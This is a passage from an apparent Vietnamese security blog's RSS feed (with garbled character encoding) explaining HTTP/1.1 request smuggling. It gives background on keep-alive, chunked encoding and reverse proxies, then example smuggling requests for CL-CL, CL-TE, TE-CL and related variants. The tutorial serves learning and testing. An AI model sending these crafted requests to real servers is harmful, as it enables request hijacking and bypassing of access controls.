      <comments>https://rayinaw.github.io/2022/12/03/docker-learning/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>KhÃ¡i niá»‡m cÆ¡ báº£n vá» HTTP request smuggling vá»›i HTTP/1.1</title>
      <link>https://rayinaw.github.io/2022/11/30/http-request-smuggling-HTTP-1.1/</link>
      <guid>https://rayinaw.github.io/2022/11/30/http-request-smuggling-HTTP-1.1/</guid>
      <pubDate>Wed, 30 Nov 2022 03:36:10 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Loi-noi-dau&quot;&gt;&lt;a href=&quot;#Loi-noi-dau&quot; class=&quot;headerlink&quot; title=&quot;Lá»i nÃ³i Ä‘áº§u:&quot;&gt;&lt;/a&gt;Lá»i nÃ³i Ä‘áº§u:&lt;/h1&gt;&lt;p&gt;BÃ i viáº¿t nÃ y lÃ  vá» khÃ¡i niá»‡m vÃ  </description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Loi-noi-dau"><a href="#Loi-noi-dau" class="headerlink" title="Lá»i nÃ³i Ä‘áº§u:"></a>Lá»i nÃ³i Ä‘áº§u:</h1><p>BÃ i viáº¿t nÃ y lÃ  vá» khÃ¡i niá»‡m vÃ  cÃ¡ch HRS xáº£y ra Ä‘á»‘i vá»›i HTTP&#x2F;1.1, vá»›i HTTP&#x2F;2.0 vÃ  thá»±c hÃ nh cÃ¡c báº¡n cÃ³ thá»ƒ xem á»Ÿ bÃ i viáº¿t sau.</p><h1 id="Mot-vai-kien-thuc-can-nam"><a href="#Mot-vai-kien-thuc-can-nam" class="headerlink" title="Má»™t vÃ i kiáº¿n thá»©c cáº§n náº¯m:"></a>Má»™t vÃ i kiáº¿n thá»©c cáº§n náº¯m:</h1><h2 id="Keep-Alive-va-Pipelining"><a href="#Keep-Alive-va-Pipelining" class="headerlink" title="Keep-Alive vÃ  Pipelining:"></a>Keep-Alive vÃ  Pipelining:</h2><p>Keep-Alive vÃ  Pipelining Ä‘Æ°á»£c giá»›i thiá»‡u trong RFC-2616:<br><code>Keep-Alive</code> cho phÃ©p má»™t káº¿t ná»‘i TCP giá»¯a Client vÃ  Server Ä‘Æ°á»£c tiáº¿p tá»¥c gá»­i vÃ  nháº­n HTTP requests vÃ  responses thay vÃ¬ má»Ÿ láº¡i káº¿t ná»‘i sau má»—i láº§n Client yÃªu cáº§u. Theo nhÆ° mÃ¬nh tháº¥y thÃ¬ má»™t sá»‘ server sáº½ set out timeout cho má»™t káº¿t ná»‘i keep-alive, sau khi user 1 yÃªu cáº§u Ä‘áº¿n server vÃ  server gá»­i response vá», káº¿t ná»‘i váº«n Ä‘Æ°á»£c má»Ÿ vÃ  user khÃ¡c cÃ³ thá»ƒ sá»­ dá»¥ng káº¿t ná»‘i nÃ y. Äá»ƒ báº­t mode Keep-Alive chÃºng ta cáº§n thÃªm trÆ°á»ng <code>Connection: Keep-Alive</code> vÃ o request.</p><p><code>Pipelining</code> cho phÃ©p client gá»­i nhiá»u yÃªu cáº§u HTTP má»™t lÃºc mÃ  khÃ´ng cáº§n Ä‘á»£i pháº£n há»“i cá»§a server thÃ´ng qua má»™t káº¿t ná»‘i TCP Ä‘Æ°á»£c má»Ÿ, server sáº½ pháº£n há»“i theo thá»© tá»± mÃ  request Ä‘Æ°á»£c gá»­i Ä‘i. Äá»ƒ báº­t mode Pipeline chÃºng ta cáº§n thÃªm trÆ°á»ng <code>Connection: Pipelining</code> vÃ o request.</p><h2 id="Content-Length-va-Transfer-Encoding"><a href="#Content-Length-va-Transfer-Encoding" class="headerlink" title="Content-Length vÃ  Transfer-Encoding:"></a>Content-Length vÃ  Transfer-Encoding:</h2><h3 id="Content-Length"><a href="#Content-Length" class="headerlink" title="Content-Length:"></a>Content-Length:</h3><p>Äá»‘i vá»›i má»™t yÃªu cáº§u POST, báº¯t buá»™c pháº£i cÃ³ 1 hoáº·c hÆ¡n trong 3 phÆ°Æ¡ng thá»©c <code>Content-Length</code>, <code>Transfer-Encoding</code>, <code>Content-Type</code> vÃ  Ä‘Æ°Æ¡ng nhiÃªn nÃ³ pháº£i Ä‘Ãºng Ä‘á»‹nh dáº¡ng.</p><p><code>Content-Length</code> Ä‘á» cáº­p Ä‘áº¿n kÃ­ch thÆ°á»›c pháº§n body cá»§a má»™t yÃªu cáº§u HTTP tÃ­nh báº±ng byte. Náº¿u má»™t tá»‡p vÄƒn báº£n Ä‘Æ°á»£c nÃ©n, thÃ¬ Content-Length cá»§a nÃ³ sáº½ lÃ  kÃ­ch thÆ°á»›c Ä‘Æ°á»£c nÃ©n. TiÃªu Ä‘á» <code>Content-Length</code> chá»‰ cÃ³ á»Ÿ POST request vÃ¬ nÃ³ cÃ³ trÆ°á»ng ná»™i dung cÃ²n GET request thÃ¬ khÃ´ng.</p><h3 id="Transfer-Encoding"><a href="#Transfer-Encoding" class="headerlink" title="Transfer-Encoding:"></a>Transfer-Encoding:</h3><p><code>Transfer-Encoding</code> chá»‰ ra kiá»ƒu truyá»n táº£i nÃ o Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ truyá»n táº£i ná»™i dung(pháº§n body). Transfer-Encoding cÃ³ nhiá»u kiá»ƒu truyá»n táº£i, nhÆ°ng vá»›i lá»—i HRS chÃºng ta chá»‰ cáº§n chÃº Ã½ Ä‘áº¿n phÆ°Æ¡ng thá»©c <code>Transfer-Encoding: chunked</code>.</p><p>Vá»›i <code>Transfer-Encoding: chunked</code> Dá»¯ liá»‡u body sáº½ Ä‘Æ°á»£c truyá»n theo tá»«ng khá»‘i. Báº¯t Ä‘áº§u bá»Ÿi má»™t sá»‘ hex biá»ƒu thá»‹ sá»‘ byte cá»§a ná»™i dung Ä‘áº§u tiÃªn, tiáº¿p theo sau lÃ  data. Tiáº¿p Ä‘áº¿n lÃ  láº§n lÆ°á»£t nhá»¯ng Ä‘oáº¡n hex, data nhÆ° váº­y. Äá»ƒ káº¿t thÃºc ná»™i dung byte cuá»‘i cÃ¹ng sáº½ lÃ  0 vÃ  theo sau lÃ  \r\n. Má»™t \r\n Ä‘Æ°á»£c gá»i lÃ  má»™t CRLF, Ä‘á»™ dÃ i khÃ´ng bao gá»“m CRLF. VÃ­ dá»¥:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Nguá»“n wiki.</span><br><span class="line"><span class="number">4</span>\r\<span class="title function_ invoke__">n</span>        (bytes to send)</span><br><span class="line">Wiki\r\<span class="title function_ invoke__">n</span>     (data)</span><br><span class="line"><span class="number">6</span>\r\<span class="title function_ invoke__">n</span>        (bytes to send)</span><br><span class="line">pedia \r\<span class="title function_ invoke__">n</span>   (data)</span><br><span class="line">E\r\<span class="title function_ invoke__">n</span>        (bytes to send)</span><br><span class="line">in \r\n</span><br><span class="line">\r\n</span><br><span class="line">chunks.\r\<span class="title function_ invoke__">n</span>  (data)</span><br><span class="line"><span class="number">0</span>\r\<span class="title function_ invoke__">n</span>        (<span class="keyword">final</span> byte - <span class="number">0</span>)</span><br><span class="line">\r\<span class="title function_ invoke__">n</span>         (end message)</span><br></pre></td></tr></table></figure><p>á» phÆ°Æ¡ng thá»©c Transfer-Encoding chÃºng ta cáº§n náº¯m cÃ¡ch Ä‘áº¿m byte:</p><ul><li>Náº¿u dá»¯ liá»‡u trÃªn 1 dÃ²ng thÃ¬ khÃ´ng cáº§n Ä‘áº¿m \r\n sau nÃ³.</li><li>Náº¿u dá»¯ liá»‡u nhiá»u dÃ²ng nhÆ° dÃ²ng <code>E\r\n (bytes to send)</code> á»Ÿ trÃªn thÃ¬ chÃºng ta cáº§n Ä‘áº¿m háº¿t ká»ƒ cáº£ \r \n (lÆ°u Ã½ \r hay \n chá»‰ tÃ­nh lÃ  1 byte), á»Ÿ dÃ²ng cuá»‘i cÃ¹ng cá»§a khá»‘i data nÃ y cÃ³ \r\n chÃºng ta sáº½ khÃ´ng Ä‘áº¿m nÃ³ vÃ o.</li><li>Sau Ä‘Ã³ chuyá»ƒn Ä‘á»™ dÃ i thÃ nh sá»‘ hex tÆ°Æ¡ng á»©ng.</li></ul><h2 id="Reverse-proxy"><a href="#Reverse-proxy" class="headerlink" title="Reverse proxy:"></a>Reverse proxy:</h2><p>Reverse Proxy lÃ  má»™t loáº¡i proxy server, nÃ³ Ä‘Ã³ng vai trÃ² nhÆ° má»™t server bÃ¬nh thÆ°á»ng. NÃ³ tiáº¿p nháº­n yÃªu cáº§u tá»« user, rá»“i chuyá»ƒn tiáº¿p Ä‘áº¿n cÃ¡c mÃ¡y chá»§ khÃ¡c xá»­ lÃ½ yÃªu cáº§u Ä‘Ã³ rá»“i tráº£ vá» cho ngÆ°á»i dÃ¹ng. NgÆ°á»i dÃ¹ng á»Ÿ Ä‘Ã¢y chá»‰ giao tiáº¿p vá»›i reverse proxy server mÃ  khÃ´ng biáº¿t vá» sá»± tá»“n táº¡i cá»§a mÃ¡y chá»§ khÃ¡c.<br>Cáº¥u trÃºc cá»§a má»™t request tá»« user Ä‘áº¿n má»™t mÃ¡y chá»§ cÃ³ tá»“n táº¡i reverse proxy nhÆ° sau:<br>user â€”requestâ€”&gt; reverse proxy â€”requestâ€”&gt; back-end server<br>user &lt;â€“responseâ€” reverse proxy &lt;â€“responseâ€” back-end server</p><h2 id="Khai-niem-web-cache"><a href="#Khai-niem-web-cache" class="headerlink" title="KhÃ¡i niá»‡m web cache:"></a>KhÃ¡i niá»‡m web cache:</h2><p>Web cache sinh ra Ä‘á»ƒ nÃ¢ng cao tráº£i nghiá»‡m ngÆ°á»i dÃ¹ng. Khi ngÆ°á»i dÃ¹ng yÃªu cáº§u nhÆ° nhá»¯ng dá»¯ liá»‡u nhÆ° HTML, CSS, Javascript, image,â€¦, server cÃ³ thá»ƒ sáº½ lÆ°u vÃ o web cache Ä‘á»ƒ khÃ´ng pháº£i thá»±c hiá»‡n láº¡i nhá»¯ng truy váº¥n Ä‘á»ƒ láº¥y nhá»¯ng dá»¯ liá»‡u Ä‘Ã³, giÃºp cho viá»‡c láº¥y dá»¯ liá»‡u nhanh hÆ¡n, Ä‘á»¡ tá»‘n tÃ i nguyÃªn hÆ¡n cho ngÆ°á»i dÃ¹ng.</p><h3 id="Co-mot-so-loai-web-cache-nhu-sau"><a href="#Co-mot-so-loai-web-cache-nhu-sau" class="headerlink" title="CÃ³ má»™t sá»‘ loáº¡i web cache nhÆ° sau:"></a>CÃ³ má»™t sá»‘ loáº¡i web cache nhÆ° sau:</h3><p>Web cache á»Ÿ phÃ­a browser: Sau khi ngÆ°á»i dÃ¹ng thá»±c hiá»‡n request láº§n Ä‘áº§u tiÃªn Ä‘áº¿n server, náº¿u server há»— trá»£ cache á»Ÿ browser ngÆ°á»i dÃ¹ng, dá»¯ liá»‡u sáº½ Ä‘Æ°á»£c lÆ°u vÃ o cache á»Ÿ browser cá»§a ngÆ°á»i dÃ¹ng (nÃªn xÃ³a lá»‹ch sá»­ web hay cÃ³ má»¥c cache). Khi ngÆ°á»i dÃ¹ng request nhá»¯ng láº§n tiáº¿p theo tÆ°Æ¡ng tá»± nhÆ° yÃªu cáº§u Ä‘áº§u tiÃªn, browser chá»‰ cáº§n láº¥y tá»« cache cá»§a browser Ä‘á»ƒ render ra cho ngÆ°á»i dÃ¹ng.<br>Web cache phÃ­a Proxy Server: NÃ³ thÆ°á»ng lÃ  CDN caching. NÃ³ hoáº¡t Ä‘á»™ng tÆ°Æ¡ng tá»± nhÆ° browser caching tuy nhiÃªn nÆ¡i lÆ°u trá»¯ cache á»Ÿ Ä‘Ã¢y lÃ  CDN server trÃªn toÃ n tháº¿ giá»›i. á» Ä‘Ã¢y nhiá»u user cÃ³ thá»ƒ dÃ¹ng chung cache tá»« server gá»­i Ä‘áº¿n mÃ¡y chá»§ CDN. CÃ¡ch hoáº¡t Ä‘á»™ng cÃ¡c báº¡n cÃ³ thá»ƒ tham kháº£o thÃªm á»Ÿ <a href="https://viblo.asia/p/cdn-content-delivery-network-caching-Qpmle2O75rd">Ä‘Ã¢y</a>.<br>Web cache phÃ­a Reverse Proxy server: CÅ©ng hoáº¡t Ä‘á»™ng tÆ°Æ¡ng tá»± nhÆ° hai kiá»ƒu trÃªn, tuy nhiÃªn cache Ä‘Æ°á»£c lÆ°u trá»¯ á»Ÿ phÃ­a Reverse Proxy.<br>Video tham kháº£o thÃªm vá» web cache:</p><div class="video-container"><iframe src="https://www.youtube.com/embed/HiBDZgTNpXY" frameborder="0" loading="lazy" allowfullscreen></iframe></div> <h2 id="Yeu-cau-cua-loi-HRS"><a href="#Yeu-cau-cua-loi-HRS" class="headerlink" title="YÃªu cáº§u cá»§a lá»—i HRS:"></a>YÃªu cáº§u cá»§a lá»—i HRS:</h2><p>Äá»ƒ má»™t lá»—i HRS xáº£y ra, trang web cáº§n Ä‘Ã¡p á»©ng nhá»¯ng yÃªu cáº§u sau:</p><ul><li>Trang web bao gá»“m hai mÃ¡y chá»§ front-end (reverse proxy) vÃ  mÃ¡y chá»§ back-end.</li><li>MÃ¡y chá»§ pháº£i há»— trá»£ Keep-Alive hoáº·c Pipelining Ä‘á»ƒ yÃªu cáº§u cÃ³ thá»ƒ gáº¯n vá»›i yÃªu cáº§u cá»§a náº¡n nhÃ¢n (Náº¿u báº¡n khÃ´ng hiá»ƒu thÃ¬ cá»© bá» qua, Ä‘á»c pháº§n sau sáº½ hiá»ƒu)</li><li>MÃ¡y chá»§ front-end vÃ  back-end phÃ¢n tÃ­ch cÃ¡c trÆ°á»ng <code>Transfer-Encoding</code>, <code>Content-Length</code> khÃ´ng nghiÃªm ngáº·t khiáº¿n cho quÃ¡ trÃ¬nh phÃ¢n tÃ­ch máº¯c sai láº§m phÃ¡t sinh lá»—i.</li></ul><h1 id="HTTP-request-smuggling-o-HTTP-x2F-1-1"><a href="#HTTP-request-smuggling-o-HTTP-x2F-1-1" class="headerlink" title="HTTP request smuggling á»Ÿ HTTP&#x2F;1.1"></a>HTTP request smuggling á»Ÿ HTTP&#x2F;1.1</h1><h2 id="CL-Content-Length-khong-bang-0"><a href="#CL-Content-Length-khong-bang-0" class="headerlink" title="CL(Content-Length) khÃ´ng báº±ng 0:"></a>CL(Content-Length) khÃ´ng báº±ng 0:</h2><p>GET mang ná»™i dung thÃ¬ khÃ¡ láº¡, nhÆ°ng mÃ  nÃ y thá»±c sá»± xáº£y ra. KhÃ¡ khÃ³ hiá»ƒu vá»›i mÃ¬nh. Váº¥n Ä‘á»:</p><ul><li>MÃ¡y chá»§ proxy cho phÃ©p yÃªu cáº§u GET mang ná»™i dung, nhÆ°ng mÃ¡y chá»§ phÃ­a sau khÃ´ng cho phÃ©p mang ná»™i dung request, mÃ¡y chá»§ phÃ­a sau sáº½ trá»±c tiáº¿p bá» trÆ°á»ng Content-Length vÃ  khÃ´ng xá»­ lÃ½ nÃ³. Tá»« Ä‘Ã¢y nÃ³ sáº½ phÃ¡t sinh ra lá»—i HRS.<br>VÃ­ dá»¥:<br>Má»™t request nhÆ° sau:<figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">Content-Length: <span class="number">44</span>\r\n</span><br><span class="line"> </span><br><span class="line">GET /secret HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>MÃ¡y chá»§ Proxy nháº­n Ä‘Æ°á»£c yÃªu cáº§u, nhÆ° mÃ¬nh Ä‘Ã£ nÃ³i, vÃ¬ má»™t lÃ½ do nÃ o Ä‘Ã³ mÃ  request nÃ y Ä‘Æ°á»£c cháº¥p nháº­n á»Ÿ mÃ¡y chá»§ Proxy mÃ¬nh khÃ´ng biáº¿t :). NÃ³ sáº½ chuyá»ƒn Ä‘áº¿n mÃ¡y chá»§ phÃ­a sau, táº¡i Ä‘Ã¢y nÃ³ khÃ´ng cháº¥p nháº­n trÆ°á»ng Content-Length nÃªn nÃ³ sáº½ xem nhÆ° lÃ  yÃªu cáº§u riÃªng biá»‡t, vÃ  náº¿u mÃ¡y chá»§ cÃ³ sá»­ dá»¥ng <code>pipelining</code>, nÃ³ sáº½ xem nhÆ° lÃ  hai yÃªu cáº§u riÃªng biá»‡t.<br>YÃªu cáº§u thá»© nháº¥t:<figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">Host: example.com\r\n</span><br></pre></td></tr></table></figure>YÃªu cáº§u thá»© hai:<figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET / secret HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">Host: example.com\r\n</span><br></pre></td></tr></table></figure></li></ul><h2 id="CL-CL"><a href="#CL-CL" class="headerlink" title="CL-CL:"></a>CL-CL:</h2><p>KÄ© thuáº­t táº¥n cÃ´ng CL-CL lÃ  má»™t yÃªu cáº§u HTTP chá»©a 2 trÆ°á»ng Content-Length. Theo <img src="https://www.rfc-editor.org/rfc/rfc7230#section-3.3.3" alt="RFC-7230">, náº¿u mÃ¡y chá»§ nháº­n Ä‘Æ°á»£c hai yÃªu cáº§u Content-Length vÃ  giÃ¡ trá»‹ cá»§a 2 yÃªu cáº§u Ä‘Ã³ khÃ¡c nhau thÃ¬ nÃ³ sáº½ tráº£ vá» lá»—i 400. Tuy nhiÃªn Ä‘Ã´i lÃºc sáº½ cÃ³ nhá»¯ng mÃ¡y chá»§ khÃ´ng tuÃ¢n thá»§ nghiÃªm ngáº·t thÃ´ng sá»‘ nÃ y vÃ  dáº«n Ä‘áº¿n HRS.</p><p>Giáº£ sá»­ má»™t ká»‹ch báº£n táº¥n cÃ´ng sáº½ lÃ  cáº£ mÃ¡y chá»§ proxy vÃ  mÃ¡y chá»§ gá»‘c Ä‘á» khÃ´ng tráº£ vá» lá»—i 400, vÃ  mÃ¡y chá»§ proxy sá»­ dá»¥ng trÆ°á»ng <code>Content-Length</code> Ä‘áº§u tiÃªn vÃ  mÃ¡y chá»§ gá»‘c sá»­ dá»¥ng trÆ°á»ng <code>Content-Length</code> thá»© hai.</p><p>VÃ­ dá»¥ má»™t request nhÆ° sau:</p><figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">Content-Length: <span class="number">8</span>\r\n</span><br><span class="line">Content-Length: <span class="number">7</span>\r\n</span><br><span class="line"> </span><br><span class="line"><span class="number">12345</span>\r\n</span><br><span class="line">a</span><br></pre></td></tr></table></figure><p>PhÃ¢n tÃ­ch:</p><ul><li>MÃ¡y chá»§ proxy nháº­n <code>Content-Length: 8\r\n</code>, dÃ²ng thá»© 5 trá»‘ng lÃ  má»™t dÃ²ng thÃ´ng thÆ°á»ng cá»§a yÃªu cáº§u POST nÃªn khÃ´ng tÃ­nh vÃ o pháº§n ná»™i dung, <code>12345 + \r + \n + a = 8 bytes</code> thÃµa mÃ£n vá»›i trÆ°á»ng <code>Content-Length</code>nÃªn nÃ³ chuyá»ƒn tiáº¿p yÃªu cáº§u Ä‘áº¿n mÃ¡y chá»§ back-end.</li><li>MÃ¡y chá»§ Back-End nháº­n trÆ°á»ng <code>Content-Length: 7\r\n</code>, sau khi Ä‘á»c 7 kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  háº¿t dÃ²ng thá»© 6, mÃ¡y chá»§ Back-End cho ráº±ng quÃ¡ trÃ¬nh Ä‘á»c Ä‘Ã£ hoÃ n thÃ nh sau Ä‘Ã³ gá»­i response vá» cho client. LÃºc nÃ y trong bá»™ Ä‘á»‡m cÃ²n má»™t kÃ­ tá»± <code>a</code>, mÃ¡y chá»§ back-end sáº½ xem nhÆ° Ä‘Ã¢y lÃ  má»™t pháº§n cá»§a yÃªu cáº§u (request) tiáº¿p theo.</li></ul><p>BÃ¢y giá» giáº£ sá»­ nhÆ° cÃ³ má»™t ngÆ°á»i dÃ¹ng khÃ¡c gá»­i má»™t yÃªu cáº§u Ä‘áº¿n mÃ¡y chá»§:</p><figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /index.html HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">Host: example.com\r\n</span><br></pre></td></tr></table></figure><p>Dá»±a trÃªn viá»‡c sá»­ dá»¥ng láº¡i káº¿t ná»‘i TCP giá»¯a mÃ¡y chá»§ proxy vÃ  mÃ¡y chá»§ back-end, <code>a</code> sáº½ Ä‘Æ°á»£c káº¿t há»£p vá»›i yÃªu cáº§u nÃ y Ä‘á»ƒ táº¡o thÃ nh má»™t yÃªu cáº§u má»›i:</p><figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aGET /index.html HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">Host: example.com\r\n</span><br></pre></td></tr></table></figure><p>LÃºc nÃ y táº¡i mÃ¡y khÃ¡ch sáº½ nháº­n Ä‘Æ°á»£c má»™t lá»—i <code>aGET request method not found</code>, cho chÃºng ta biáº¿t Ä‘Æ°á»£c ráº±ng HRS Ä‘Ã£ xáº£y ra.</p><h2 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE"></a>CL-TE</h2><p>Trong trÆ°á»ng há»£p nÃ y, mÃ¡y chá»§ Front-End sá»­ dá»¥ng <code>Content-Length</code> vÃ  mÃ¡y chá»§ Back-End sá»­ dá»¥ng <code>Transfer-Encoding</code>.</p><p>Giáº£ sá»­ má»™t yÃªu cáº§u nhÆ° sau:</p><figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">Connection: keep-alive\r\n</span><br><span class="line">Content-Length: <span class="number">6</span>\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">\r\n</span><br><span class="line"><span class="number">0</span>\r\n</span><br><span class="line">\r\n</span><br><span class="line">a</span><br></pre></td></tr></table></figure><p>MÃ¡y chá»§ Front-End nháº­n trÆ°á»ng <code>Content-Length: 6\r\n</code>, dÃ²ng thá»© 6 khÃ´ng tÃ­nh vÃ o <code>Content-Length</code>, dÃ²ng 7-9 cÃ³ <code>0 + \r\n + \r\n + a = 6 bytes</code> thÃµa mÃ£n, nÃªn yÃªu cáº§u Ä‘Æ°á»£c chuyá»ƒn Ä‘áº¿n mÃ¡y chá»§ back-end.<br>MÃ¡y chá»§ Back-End nháº­n <code>Transfer-Encoding: chunked\r\n</code>, khi nháº­n Ä‘Æ°á»£c cá» <code>0\r\n</code> vÃ  dÃ²ng sau lÃ  <code>\r\n</code> mÃ¡y chá»§ sáº½ xem nhÆ° lÃ  pháº§n body Ä‘Ã£ káº¿t thÃºc vÃ  lÃºc nÃ y kÃ­ tá»± a váº«n cÃ²n náº±m trong bá»™ Ä‘á»‡m.</p><p>TÆ°Æ¡ng tá»± nhÆ° CL-CL náº¿u bÃ¢y giá» cÃ³ má»™t yÃªu cáº§u gá»­i Ä‘áº¿n:</p><figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">Host: example.com\r\n</span><br></pre></td></tr></table></figure><p>NÃ³ sáº½ gá»™p kÃ­ tá»± <code>a</code> vá»›i request nÃ y thÃ nh:</p><figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aPOST / HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">Host: example.com\r\n</span><br></pre></td></tr></table></figure><p>VÃ  client sáº½ nháº­n lá»—i <code>Unrecognized method aPOST</code> cÃ³ nghÄ©a lÃ  HRS Ä‘Ã£ xáº£y ra.</p><h2 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE-CL"></a>TE-CL</h2><p>MÃ¡y chá»§ Front-End sá»­ dá»¥ng tiÃªu Ä‘á» <code>Transfer-Encoding</code>, mÃ¡y chá»§ Back-End sá»­ dá»¥ng tiÃªu Ä‘á» <code>Content-Length</code>.<br>XÃ©t request nhÆ° sau:</p><figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">Content-Length: <span class="number">4</span>\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">\r\n</span><br><span class="line"><span class="number">12</span>\r\n</span><br><span class="line">aPOST / HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">\r\n</span><br><span class="line"><span class="number">0</span>\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>MÃ¡y chá»§ front-end nháº­n <code>Transfer-Encoding: chunked\r\n</code>, khi Ä‘á»c Ä‘áº¿n <code>0\r\n</code> vÃ  <code>\r\n</code>á»Ÿ cuá»‘i, khÃ´ng cÃ³ váº¥n Ä‘á» gÃ¬ xáº£y ra nÃªn mÃ¡y chá»§ front-end request Ä‘áº¿n mÃ¡y chá»§ back-end.<br>MÃ¡y chá»§ back-end nháº­n trÆ°á»ng <code>Content-Length: 4\r\n</code>, vÃ¬ Ä‘á»™ dÃ y chá»‰ 4 bytes tÆ°Æ¡ng Ä‘Æ°Æ¡ng 12 + \r + \r lÃ  Ä‘áº¿n háº¿t dÃ²ng thá»© 6, mÃ¡y chá»§ back-end sáº½ xem lÃ  Ä‘Ã£ káº¿t thÃºc request vÃ  pháº§n cÃ²n láº¡i tá»« dÃ²ng 7 trá»Ÿ Ä‘i khÃ´ng Ä‘Æ°á»£c xá»­ lÃ½ vÃ  mÃ¡y chá»§ back-end sáº½ coi Ä‘Ã¢y lÃ  pháº§n báº¯t Ä‘áº§u cá»§a yÃªu cáº§u tiáº¿p theo.</p><figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">aPOST / HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">\r\n</span><br><span class="line"><span class="number">0</span>\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>Táº¡i thá»i Ä‘iá»ƒm nÃ y náº¿u cÃ³ má»™t yÃªu cáº§u khÃ¡c nÃ³ sáº½ bÃ¡o lá»—i <code>Unrecognized method aPOST</code>, cÃ³ nghÄ©a lÃ  HRS Ä‘Ã£ thÃ nh cÃ´ng.</p><h2 id="TE-TE"><a href="#TE-TE" class="headerlink" title="TE-TE"></a>TE-TE</h2><p>Cáº£ mÃ¡y chá»§ front-end vÃ  mÃ¡y chá»§ back-end Ä‘á»u sá»­ dá»¥ng <code>Transfer-Encoding</code> nhÆ°ng báº±ng má»™t cÃ¡ch nÃ o Ä‘Ã³ chÃºng ta cÃ³ thá»ƒ gÃ¢y nháº§m láº«n cho mÃ¡y chá»§ Ä‘á»ƒ má»™t trong hai mÃ¡y chá»§ front-end vÃ  back-end khÃ´ng xá»­ lÃ½ <code>Transfer-Encoding</code> nhÆ° bÃ¬nh thÆ°á»ng, khi Ä‘Ã³ chÃºng ta cÃ³ thá»ƒ khai thÃ¡c lá»— há»ng CL-TE hoáº·c TE-CL tÃ¹y theo cÃ¡ch xá»­ lÃ½ cá»§a reverse proxy vÃ  back-end.</p><p>Má»™t sá»‘ cÃ¡ch Ä‘á»ƒ gÃ¢y rá»‘i cho mÃ¡y chá»§ nhÆ° sau:</p><figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding: 